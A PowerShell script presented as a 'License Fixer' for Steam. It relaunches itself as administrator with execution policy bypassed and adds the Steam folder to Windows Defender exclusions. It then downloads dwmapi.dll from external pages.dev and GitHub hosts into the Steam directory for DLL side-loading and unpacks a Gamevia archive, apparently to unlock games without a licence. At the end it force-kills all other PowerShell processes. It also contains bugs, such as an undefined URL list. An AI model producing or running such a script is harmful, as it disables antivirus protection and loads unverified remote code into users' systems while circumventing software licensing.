Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
}
catch {}

function Disable-QuickEdit {
    try {
        $hInput = $Kernel32::GetStdHandle(-10)
        $mode = 0
        if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
            $mode = $mode -band -not (0x0040 -bor 0x0020)
            $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
        }
    }
    catch { }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    $scriptPath = Join-Path $env:TEMP "license_fix_$(Get-Random).ps1"
    try {
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        if ([string]::IsNullOrWhiteSpace($scriptText)) { throw "No script block" }
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8 -Force
    }
    catch {
        Write-Host "[-] Could not re-launch as admin." -ForegroundColor Red
        Start-Sleep 5
        exit
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit
cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = ""

function Write-Log($message, $type) {
    switch ($type) {
        "SUCCESS" { Write-Host "[+] $message" -ForegroundColor Green }
        "ERROR"   { Write-Host "[-] $message" -ForegroundColor Red }
        "WARNING" { Write-Host "[!] $message" -ForegroundColor Yellow }
        default   { Write-Host "[*] $message" }
    }
}

function Remove-ItemIfExists($path) {
    if ([string]::IsNullOrWhiteSpace($path)) { return }
    try {
        $fullPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
        if (Test-Path -LiteralPath $fullPath) {
            Start-Process cmd -ArgumentList "/c icacls ""$fullPath"" /reset /T /C" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$fullPath""" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $fullPath -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
        }
    }
    catch { }
}

function ForceStopProcess($processName) {
    try {
        Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
            Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        }
    }
    catch { }
}

function CheckAndPromptProcess($processName, $message) {
    $maxWait = 30
    $waited = 0
    while ((Get-Process -Name $processName -ErrorAction SilentlyContinue) -and $waited -lt $maxWait) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
        $waited += 1.5
    }
}

function Download-FileFast {
    param([string[]]$Urls, [string]$OutputPath)
    foreach ($url in $Urls) {
        try {
            Write-Host "[*] Trying: $url" -ForegroundColor Gray
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($url, $OutputPath)
            if ((Test-Path -LiteralPath $OutputPath) -and ((Get-Item -LiteralPath $OutputPath).Length -gt 0)) {
                Write-Log "Downloaded successfully" "SUCCESS"
                return $true
            }
        }
        catch {
            Write-Host "[!] Failed: $url" -ForegroundColor Yellow
        }
    }
    return $false
}

function Download-FileParallel {
    param([string[]]$Urls, [string]$OutputPath)
    $tempPath = "$OutputPath.tmp"
    $jobs = @()
    foreach ($url in $Urls) {
        $jobs += Start-Job -ScriptBlock {
            param($u, $o)
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                $wc.DownloadFile($u, $o)
                if ((Test-Path $o) and ((Get-Item $o).Length -gt 0)) { return $true }
            }
            catch { }
            return $false
        } -ArgumentList $url, $tempPath
    }
    $finished = $jobs | Wait-Job -Timeout 30 | Receive-Job
    $jobs | Remove-Job -Force -ErrorAction SilentlyContinue
    if (($finished -contains $true) -and (Test-Path -LiteralPath $tempPath)) {
        Move-Item -LiteralPath $tempPath -Destination $OutputPath -Force
        Write-Log "Downloaded successfully" "SUCCESS"
        return $true
    }
    return $false
}

# --- Steam Durdur ---
ForceStopProcess "steam"
ForceStopProcess "steamservice"
CheckAndPromptProcess "steam" "[Please exit Steam client first]"

# --- Steam Yolu ---
try {
    if (Test-Path $steamRegPath) {
        $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
        if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name -and $properties.SteamPath) {
            $steamPath = $properties.SteamPath -replace '/','\'
        }
    }
}
catch { }

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path -LiteralPath $steamPath -PathType Container)) {
    Write-Host "[-] Steam is not installed." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# --- Defender Exclusion ---
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
        if (-not ($existing -and $existing -contains $steamPath)) {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
            Write-Log "Steam folder added to Defender exclusions." "SUCCESS"
        }
    }
}
catch { }

# --- Eski dosyalari temizle ---
$oldFiles = @(
    "winhttp.dll", "dwmapi.dll.bak", "winhttp.dll.bak", "xinput1_4.dll.bak",
    "dwmapi_update.dll", "winhttp_update.dll", "xinput1_4_update.dll",
    "SYS_0xA7.dll", "hid.dll", "version.dll", "winmm.dll",
    "OpenSteamTool.dll", "SYS_0xA7.toml", "opensteamtool.toml", "Gamevia.dll"
)
foreach ($file in $oldFiles) {
    Remove-ItemIfExists (Join-Path $steamPath $file)
}

# --- Steam cache temizle ---
Remove-ItemIfExists (Join-Path $steamPath "appcache")
Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
Remove-ItemIfExists (Join-Path $steamPath "package\beta")
Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")

# --- URL'ler ---
$dllUrls = @(
    "https://zdb2.pages.dev/dwmapi.dll",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dwmapi.dll",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dwmapi.dll"
)

$zipUrls = @(
    "https://zdb2.pages.dev/Gamevia.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
)

# --- Hepsini paralel indir ---
$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
if (!(Test-Path -LiteralPath $gamesDataPath)) {
    try { New-Item -LiteralPath $gamesDataPath -ItemType Directory -Force | Out-Null } catch { }
}

$zipOutput = Join-Path $env:TEMP "Gamevia_$(Get-Random).zip"
$dllOutput = Join-Path $steamPath "dwmapi.dll"
$xinputOutput = Join-Path $steamPath "xinput1_4.dll"
Remove-ItemIfExists $dllOutput
Remove-ItemIfExists $xinputOutput

Write-Host "[*] Downloading 3 files in parallel..." -ForegroundColor Cyan

$dlJobs = @()
$dlJobs += Start-Job -ScriptBlock {
    param($urls, $out)
    foreach ($url in $urls) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($url, $out)
            if ((Test-Path $out) and ((Get-Item $out).Length -gt 0)) { return "OK" }
        } catch { }
    }
    return "FAIL"
} -ArgumentList @(,$zipUrls), $zipOutput

$dlJobs += Start-Job -ScriptBlock {
    param($urls, $out)
    foreach ($url in $urls) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($url, $out)
            if ((Test-Path $out) and ((Get-Item $out).Length -gt 0)) { return "OK" }
        } catch { }
    }
    return "FAIL"
} -ArgumentList @(,$dllUrls), $dllOutput

$dlJobs += Start-Job -ScriptBlock {
    param($urls, $out)
    foreach ($url in $urls) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($url, $out)
            if ((Test-Path $out) and ((Get-Item $out).Length -gt 0)) { return "OK" }
        } catch { }
    }
    return "FAIL"
} -ArgumentList @(,$xinputUrls), $xinputOutput

$dlJobs | Wait-Job -Timeout 60 | Out-Null
$dlResults = $dlJobs | Receive-Job
$dlJobs | Remove-Job -Force -ErrorAction SilentlyContinue

# Gamevia.zip sonucu
if ($dlResults[0] -eq "OK" -and (Test-Path -LiteralPath $zipOutput)) {
    try {
        Expand-Archive -LiteralPath $zipOutput -DestinationPath $gamesDataPath -Force
        Write-Log "Gamevia.zip extracted to $gamesDataPath" "SUCCESS"
        $depotKeysPath = Join-Path $gamesDataPath "depotkeys.json"
        if (Test-Path -LiteralPath $depotKeysPath) {
            Remove-Item -LiteralPath $depotKeysPath -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-Log "Extract failed: $($_.Exception.Message)" "ERROR"
    }
}
else {
    Write-Log "Gamevia.zip download failed" "WARNING"
}

# dwmapi.dll sonucu
if ($dlResults[1] -eq "OK") {
    Write-Log "dwmapi.dll installed" "SUCCESS"
}
else {
    Write-Log "dwmapi.dll download failed" "ERROR"
    Start-Sleep 5
    return
}

# xinput1_4.dll sonucu
if ($dlResults[2] -eq "OK") {
    Write-Log "xinput1_4.dll installed" "SUCCESS"
}
else {
    Write-Log "xinput1_4.dll download failed, dwmapi.dll still installed" "WARNING"
}

# --- Steam Baslat ---
$steamExePath = Join-Path $steamPath "steam.exe"
if (Test-Path -LiteralPath $steamExePath) {
    try {
        Start-Process -FilePath $steamExePath -WindowStyle Normal
        Start-Sleep 2
        Start-Process "steam://"
        Write-Log "Steam started." "SUCCESS"
    }
    catch {
        Write-Log "Could not start Steam automatically." "WARNING"
    }
}

Write-Log "License fix applied." "SUCCESS"

for ($i = 3; $i -ge 0; $i--) {
    Write-Host "`r[*] Closing in $i seconds...   " -NoNewline
    Start-Sleep -Seconds 1
}

Get-Process powershell, pwsh -ErrorAction SilentlyContinue |
    Where-Object { $_.Id -ne $PID } |
    Stop-Process -Force -ErrorAction SilentlyContinue

Start-Sleep -Milliseconds 500
Stop-Process -Id $PID -Force
